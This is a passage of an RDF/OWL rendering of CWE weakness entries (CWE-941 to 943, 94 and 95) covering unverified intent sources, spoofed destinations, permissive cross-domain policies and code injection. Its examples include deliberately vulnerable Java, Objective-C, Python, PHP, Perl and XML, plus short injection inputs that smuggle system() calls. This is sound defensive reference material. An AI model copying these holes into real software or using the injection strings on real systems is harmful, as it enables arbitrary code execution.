     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Use a mechanism that can validate the identity of the source, such as a certificate, and validate the integrity of data to ensure that it cannot be modified in transit using a man-in-the-middle attack.
When designing functionality of actions in the URL scheme, consider whether the action should be accessible to all mobile applications, or if a whitelist of applications to interface with is appropriate."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker can access any functionality that is inadvertently accessible to the source."^^xsd:string, 
                 rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
This Android application will remove a user account when it receives an intent to do so:

(bad code)
Example Language: Java 
IntentFilter filter = new IntentFilter(\"com.example.RemoveUser\");
MyReceiver receiver = new MyReceiver();
registerReceiver(receiver, filter);

public class DeleteReceiver extends BroadcastReceiver {
@Override
public void onReceive(Context context, Intent intent) {
int userID = intent.getIntExtra(\"userID\");
destroyUserData(userID);
}
}
This application does not check the origin of the intent, thus allowing any malicious application to remove a user. Always check the origin of an intent, or create a whitelist of trusted applications using the manifest.xml file."^^xsd:string, 
                 rdfs:comment "Example 2
These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:

(bad code)
Example Language: Java 

// Android 
@Override
public boolean shouldOverrideUrlLoading(WebView view, String url){
if (url.substring(0,14).equalsIgnoreCase(\"examplescheme:\")){
if(url.substring(14,25).equalsIgnoreCase(\"getUserInfo\")){
writeDataToView(view, UserData);
return false;
}
else{
return true;
}
}
}
(bad code)
Example Language: Objective-C 

// iOS 
-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType
{
NSURL *URL = [exRequest URL];
if ([[URL scheme] isEqualToString:@\"exampleScheme\"])
{
NSString *functionString = [URL resourceSpecifier];
if ([functionString hasPrefix:@\"specialFunction\"])
{

// Make data available back in webview. 
UIWebView *webView = [self writeDataToView:[URL query]];
}
return NO;
}
return YES;
}
A call into native code can then be initiated by passing parameters within the URL:

(attack code)
Example Language: JavaScript 
window.location = examplescheme://method?parameter=value
Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Gain Privileges or Assume Identity"^^xsd:string,
     other  "Varies by Context"^^xsd:string,
     paradigms  "Mobile"^^xsd:string
    
    
Individual: CWE-941_Incorrectly_Specified_Destination_in_a_Communication_Channel

    Annotations: 
        rdfs:comment "Attackers at the destination may be able to spoof trusted servers to steal data or cause a denial of service.

There are at least two distinct weaknesses that can cause the software to communicate with an unintended destination:
 - If the software allows an attacker to control which destination is specified, then the attacker can cause it to connect to an untrusted or malicious destination. For example, because UDP is a connectionless protocol, UDP packets can be spoofed by specifying a false source address in the packet; when the server receives the packet and sends a reply, it will specify a destination by using the source of the incoming packet - i.e., the false source. The server can then be tricked into sending traffic to the wrong host, which is effective for hiding the real source of an attack and for conducting a distributed denial of service (DDoS). As another example, server-side request forgery (SSRF) and XML External Entity (XXE) can be used to trick a server into making outgoing requests to hosts that cannot be directly accessed by the attacker due to firewall restrictions.
 - If the software incorrectly specifies the destination, then an attacker who can control this destination might be able to spoof trusted servers. While the most common occurrence is likely due to misconfiguration by an administrator, this can be resultant from other weaknesses. For example, the software might incorrectly parse an e-mail or IP address and send sensitive data to an unintended destination. As another example, an Android application may use a \"sticky broadcast\" to communicate with a receiver for a particular application, but since sticky broadcasts can be processed by *any* receiver, this can allow a malicious application to access restricted data that was only intended for a different application."^^xsd:string,
        rdfs:comment "Maintenance:
This entry will be made more comprehensive in later CWE versions."^^xsd:string,
        rdfs:comment "The software creates a communication channel to initiate an outgoing request to an actor, but it does not correctly specify the intended destination for that actor."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1014_Identify_Actors,
     
     Annotations: rdfs:comment "Classic \"Smurf\" attack, using spoofed ICMP packets to broadcast addresses."^^xsd:string
                 
                 references  CVE-1999-0513,
     
     Annotations: rdfs:comment "DNS query with spoofed source address causes more traffic to be returned to spoofed address than was sent by the attacker."^^xsd:string
                 
                 references  CVE-1999-1379,
     
     Annotations: rdfs:comment "composite: NTP feature generates large responses (high amplification factor) with spoofed UDP source addresses."^^xsd:string
                 
                 references  CVE-2013-5211,
     ID  "941"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
This code listens on a port for DNS requests and sends the result to the requesting address.

(bad code)
Example Language: Python 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind( (UDP_IP,UDP_PORT) )
while true:
data = sock.recvfrom(1024)
if not data:
break

(requestIP, nameToResolve) = parseUDPpacket(data)
record = resolveName(nameToResolve)
sendResponse(requestIP,record)
This code sends a DNS record to a requesting IP address. UDP allows the source IP address to be easily changed ('spoofed'), thus allowing an attacker to redirect responses to a target, which may be then be overwhelmed by the network traffic."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     paradigms  "Mobile"^^xsd:string
    
    
Individual: CWE-942_Overly_Permissive_Cross-domain_Whitelist

    Annotations: 
        rdfs:comment "A cross-domain policy file (\"crossdomain.xml\" in Flash and \"clientaccesspolicy.xml\" in Silverlight) defines a whitelist of domains from which a server is allowed to make cross-domain requests. When making a cross-domain request, the Flash or Silverlight client will first look for the policy file on the target server. If it is found, and the domain hosting the application is explicitly allowed to make requests, the request is made.

Therefore, if a cross-domain policy file includes domains that should not be trusted, such as when using wildcards, then the application could be attacked by these untrusted domains.

An overly permissive policy file allows many of the same attacks seen in Cross-Site Scripting (CWE-79). Once the user has executed a malicious Flash or Silverlight application, they are vulnerable to a variety of attacks. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site.

In many cases, the attack can be launched without the victim even being aware of it."^^xsd:string,
        rdfs:comment "Maintenance:
This entry will be made more comprehensive in future CWE versions."^^xsd:string,
        rdfs:comment "Relationship:
It could be argued that data query languages are effectively a command language - albeit with a limited set of commands - and thus any query-language injection issue could be treated as a child of CWE-74. However, CWE-943 is intended to better organize query-oriented issues to separate them from fully-functioning programming languages, and also to provide a more precise identifier for the many query languages that do not have their own CWE identifier."^^xsd:string,
        rdfs:comment "The software uses a cross-domain policy file that includes domains that should not be trusted."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Chain: Adobe Flash Player does not sufficiently restrict the interpretation and usage of cross-domain policy files, which makes it easier for remote attackers to conduct cross-domain and cross-site scripting (XSS) attacks."^^xsd:string
                 
                 references  CVE-2007-6243,
     
     Annotations: rdfs:comment "Chain: Adobe Flash Player and earlier does not properly interpret policy files, which allows remote attackers to bypass a non-root domain policy."^^xsd:string
                 
                 references  CVE-2008-4822,
     
     Annotations: rdfs:comment "Chain: Adobe Flash Player does not properly handle unspecified encodings during the parsing of a cross-domain policy file, which allows remote web servers to bypass intended access restrictions via unknown vectors."^^xsd:string
                 
                 references  CVE-2010-3636,
     
     Annotations: rdfs:comment "Product has a Silverlight cross-domain policy that does not restrict access to another application, which allows remote attackers to bypass the Same Origin Policy."^^xsd:string
                 
                 references  CVE-2012-2292,
     
     Annotations: rdfs:comment "The default Flash Cross Domain policies in a product allows remote attackers to access user files."^^xsd:string
                 
                 references  CVE-2014-2049,
     ID  "942"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Execute Unauthorized Code or Commands"^^xsd:string,
     access_control  "Modify Application Data"^^xsd:string,
     access_control  "Read Application Data"^^xsd:string,
     access_control  "Varies by Context"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction
Avoid using wildcards in the cross-domain policy file. Any domain matching the wildcard expression will be implicitly trusted, and can perform two-way interaction with the target server."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction
For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening
For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "Bypass Protection Mechanism"^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     availability  "Modify Application Data"^^xsd:string,
     availability  "Read Application Data"^^xsd:string,
     availability  "Varies by Context"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker may be able to bypass the web browser's same-origin policy. An attacker can exploit the weakness to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running ActiveX controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content."^^xsd:string, 
                 rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Bypass Protection Mechanism"^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     confidentiality  "Varies by Context"^^xsd:string,
     
     Annotations: rdfs:comment "These cross-domain policy files mean to allow Flash and Silverlight applications hosted on other domains to access its data:

Flash crossdomain.xml :

(bad code)
Example Language: XML 
<cross-domain-policy xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
xsi:noNamespaceSchemaLocation=\"http://www.adobe.com/xml/schemas/PolicyFile.xsd\">
<allow-access-from domain=\"*.example.com\"/>
<allow-access-from domain=\"*\"/>
</cross-domain-policy>
Silverlight clientaccesspolicy.xml :

(bad code)
Example Language: XML 
<?xml version=\"1.0\" encoding=\"utf-8\"?>
<access-policy>
<cross-domain-access>
<policy>
<allow-from http-request-headers=\"SOAPAction\">
<domain uri=\"*\"/>
</allow-from>
<grant-to>
<resource path=\"/\" include-subpaths=\"true\"/>
</grant-to>
</policy>
</cross-domain-access>
</access-policy>
These entries are far too permissive, allowing any Flash or Silverlight application to send requests. A malicious application hosted on any other web site will be able to send requests on behalf of any user tricked into executing it."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     implementation  ""^^xsd:string,
     integrity  "Bypass Protection Mechanism"^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     integrity  "Varies by Context"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Attack Surface Reduction
For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening
For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server."^^xsd:string
                 
                 operation  ""^^xsd:string,
     paradigms  "Web Based"^^xsd:string
    
    
Individual: CWE-943_Improper_Neutralization_of_Special_Elements_in_Data_Query_Logic

    Annotations: 
        rdfs:comment "Depending on the capabilities of the query language, an attacker could inject additional logic into the query to:
 - Modify the intended selection criteria, thus changing which data entities (e.g., records) are returned, modified, or otherwise manipulated
 - Append additional commands to the query
 - Return more entities than intended
 - Return fewer entities than intended
 - Cause entities to be sorted in an unexpected way
The ability to execute additional commands or change which entities are returned has obvious risks. But when the application logic depends on the order or number of entities, this can also lead to vulnerabilities. For example, if the application query expects to return only one entity that specifies an administrative user, but an attacker can change which entities are returned, this could cause the logic to return information for a regular user and incorrectly assume that the user has administrative privileges.

While this weakness is most commonly associated with SQL injection, there are many other query languages that are also subject to injection attacks, including HTSQL, LDAP, DQL, XQuery, Xpath, and \"NoSQL\" languages."^^xsd:string,
        rdfs:comment "The application generates a query intended to access or manipulate data in a data store such as a database, but it does not neutralize or incorrectly neutralizes special elements that can modify the intended logic of the query."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "Injection using Documentum Query Language (DQL)"^^xsd:string
                 
                 references  CVE-2014-2503,
     
     Annotations: rdfs:comment "Injection using Documentum Query Language (DQL)"^^xsd:string
                 
                 references  CVE-2014-2508,
     ID  "943"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     availability  "Bypass Protection Mechanism"^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Bypass Protection Mechanism"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Bypass Protection Mechanism"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-94_Improper_Control_of_Generation_of_Code

    Annotations: 
        rdfs:comment "Research Gap:
Many of these weaknesses are under-studied and under-researched, and terminology is not sufficiently precise."^^xsd:string,
        rdfs:comment "The software constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."^^xsd:string,
        rdfs:comment "When software allows a user's input to contain code syntax, it might be possible for an attacker to craft the code in such a way that it will alter the intended control flow of the software. Such an alteration could lead to arbitrary code execution.

Injection problems encompass a wide variety of issues -- all mitigated in very different ways. For this reason, the most effective way to discuss these weaknesses is to note the distinct features which classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed. The most classic instantiations of this category of weakness are SQL injection and format string vulnerabilities."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "chain: Resultant eval injection. An invalid value prevents initialization of variables, which can be modified by attacker and later injected into PHP eval statement."^^xsd:string
                 
                 references  CVE-2001-1471,
     
     Annotations: rdfs:comment "Perl code directly injected into CGI library file from parameters to another CGI program."^^xsd:string
                 
                 references  CVE-2002-0495,
     
     Annotations: rdfs:comment "Eval injection in PHP program."^^xsd:string
                 
                 references  CVE-2002-1750,
     
     Annotations: rdfs:comment "Direct code injection into Perl eval function."^^xsd:string
                 
                 references  CVE-2002-1752,
     
     Annotations: rdfs:comment "Eval injection in Perl program."^^xsd:string
                 
                 references  CVE-2002-1753,
     
     Annotations: rdfs:comment "PHP code from User-Agent HTTP header directly inserted into log file implemented as PHP script."^^xsd:string
                 
                 references  CVE-2003-0395,
     
     Annotations: rdfs:comment "Direct code injection into Perl eval function."^^xsd:string
                 
                 references  CVE-2005-1527,
     
     Annotations: rdfs:comment "Direct PHP code injection into supporting template file."^^xsd:string
                 
                 references  CVE-2005-1876,
     
     Annotations: rdfs:comment "Direct code injection into PHP script that can be accessed by attacker."^^xsd:string
                 
                 references  CVE-2005-1894,
     
     Annotations: rdfs:comment "MFV. code injection into PHP eval statement using nested constructs that should not be nested."^^xsd:string
                 
                 references  CVE-2005-1921,
     
     Annotations: rdfs:comment "MFV. code injection into PHP eval statement using nested constructs that should not be nested."^^xsd:string
                 
                 references  CVE-2005-2498,
     
     Annotations: rdfs:comment "Direct code injection into Perl eval function."^^xsd:string
                 
                 references  CVE-2005-2837,
     
     Annotations: rdfs:comment "Code injection into Python eval statement from a field in a formatted file."^^xsd:string
                 
                 references  CVE-2005-3302,
     
     Annotations: rdfs:comment "Eval injection in Python program."^^xsd:string
                 
                 references  CVE-2007-1253,
     
     Annotations: rdfs:comment "Eval injection in PHP program."^^xsd:string
                 
                 references  CVE-2008-5071,
     
     Annotations: rdfs:comment "Eval injection in Perl program using an ID that should only contain hyphens and numbers."^^xsd:string
                 
                 references  CVE-2008-5305,
     related_attack_patterns  CAPEC-242,
     
     Annotations: rdfs:comment "Leverage Executable Code in Non-Executable Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-35,
     
     Annotations: rdfs:comment "Manipulating User-Controlled Variables"^^xsd:string
                 
                 related_attack_patterns  CAPEC-77,
     ID  "94"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "In some cases, injectable code controls authentication; this may lead to a remote vulnerability."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "Injected code can access resources that the attacker is directly prevented from accessing."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Refactor your program so that you do not have to dynamically generate code."^^xsd:string, 
                 rdfs:comment "Run your code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which code can be executed by your software.
Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection.
This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.
Be careful to avoid CWE-243 and other weaknesses related to jails."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code."^^xsd:string
                 
                 availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     class  "Interpreted"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code."^^xsd:string
                 
                 confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. This example attempts to write user messages to a message file and allow users to view them.

(bad code)
Example Language: PHP 
$MessageFile = \"cwe-94/messages.out\";
if ($_GET[\"action\"] == \"NewMessage\") {
$name = $_GET[\"name\"];
$message = $_GET[\"message\"];
$handle = fopen($MessageFile, \"a+\");
fwrite($handle, \"<b>$name</b> says '$message'<hr>\\n\");
fclose($handle);
echo \"Message Saved!<p>\\n\";
}
else if ($_GET[\"action\"] == \"ViewMessages\") {
include($MessageFile);
}
While the programmer intends for the MessageFile to only include data, an attacker can provide a message such as:

(attack code)
 
name=h4x0r
message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E
which will decode to the following:

(attack code)
 
<?php system(\"/bin/ls -l\");?>
The programmer thought they were just including the contents of a regular data file, but PHP parsed it and executed the code. Now, this code is executed any time people view messages.

Notice that XSS (CWE-79) is also possible in this situation."^^xsd:string, 
                 rdfs:comment "Example 2. edit-config.pl: This CGI script is used to modify settings in a configuration file.

(bad code)
Example Language: Perl 
use CGI qw(:standard);

sub config_file_add_key {
my ($fname, $key, $arg) = @_;

# code to add a field/key to a file goes here
}

sub config_file_set_key {
my ($fname, $key, $arg) = @_;

# code to set key to a particular file goes here
}

sub config_file_delete_key {
my ($fname, $key, $arg) = @_;

# code to delete key from a particular file goes here
}

sub handleConfigAction {
my ($fname, $action) = @_;
my $key = param('key');
my $val = param('val');

# this is super-efficient code, especially if you have to invoke


# any one of dozens of different functions!

my $code = \"config_file_$action_key(\\$fname, \\$key, \\$val);\";
eval($code);
}

$configfile = \"/home/cwe/config.txt\";
print header;
if (defined(param('action'))) {
handleConfigAction($configfile, param('action'));
}
else {
print \"No action specified!\\n\";
}
The script intends to take the 'action' parameter and invoke one of a variety of functions based on the value of that parameter - config_file_add_key(), config_file_set_key(), or config_file_delete_key(). It could set up a conditional to invoke each function separately, but eval() is a powerful way of doing the same thing in fewer lines of code, especially when a large number of functions or variables are involved. Unfortunately, in this case, the attacker can provide other values in the action parameter, such as: add_key(\",\",\"); system(\"/bin/ls\"); This would produce the following string in handleConfigAction(): config_file_add_key(\",\",\"); system(\"/bin/ls\"); Any arbitrary Perl code could be added after the attacker has \"closed off\" the construction of the original function call, in order to prevent parsing errors from causing the malicious eval() to fail before the attacker's payload is activated. This particular manipulation would fail after the system() call, because the \"_key(\\$fname, \\$key, \\$val)\" portion of the string would cause an error, but this is irrelevant to the attack because the payload has already been activated."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
To reduce the likelihood of code injection, use stringent whitelists that limit which constructs are allowed. If you are dynamically constructing code that invokes a function, then verifying that the input is alphanumeric might be insufficient. An attacker might still be able to reference a dangerous function that you did not intend to allow, such as system(), exec(), or exit()."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code."^^xsd:string
                 
                 integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Often the actions performed by injected control code are unlogged."^^xsd:string
                 
                 non-repudiation  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Compilation or Build Hardening

Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's \"-T\" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184)."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's \"-T\" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184)."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible."^^xsd:string, 
                 rdfs:comment "Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results."^^xsd:string
                 
                 testing  ""^^xsd:string
    
    
Individual: CWE-95_Improper_Neutralization_of_Directives_in_Dynamically_Evaluated_Code

    Annotations: 
        rdfs:comment "Other:
Factors: special character errors can play a role in increasing the variety of code that can be injected, although some vulnerabilities do not require special characters at all, e.g. when a single function without arguments can be referenced and a terminator character is not necessary."^^xsd:string,
        rdfs:comment "Research Gap:
This issue is probably under-reported. Most relevant CVEs have been for Perl and PHP, but eval injection applies to most interpreted languages. Javascript eval injection is likely to be heavily under-reported."^^xsd:string,
        rdfs:comment "The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before using the input in a dynamic evaluation call (e.g. \"eval\")."^^xsd:string,
        rdfs:comment "This may allow an attacker to execute arbitrary code, or at least modify what code can be executed."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     references  CVE-2001-1471,
     references  CVE-2002-1750,
     references  CVE-2002-1752,
     references  CVE-2002-1753,
     references  CVE-2005-1527,
     references  CVE-2005-1921,
     references  CVE-2005-2498,
     references  CVE-2005-2837,
     references  CVE-2005-3302,
     references  CVE-2007-1253,
     references  CVE-2007-2713,
     references  CVE-2008-5071,
     references  CVE-2008-5305,
     
     Annotations: rdfs:comment "Leverage Executable Code in Non-Executable Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-35,
     ID  "95"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "In some cases, injectable code controls authentication; this may lead to a remote vulnerability."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "Injected code can access resources that the attacker is directly prevented from accessing."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "If possible, refactor your code so that it does not need to use eval() at all."^^xsd:string, 
                 rdfs:comment "This weakness is prevalent in handler/dispatch procedures that might want to invoke a large number of functions, or set a large number of variables."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     class  "Interpreted"^^xsd:string,
     
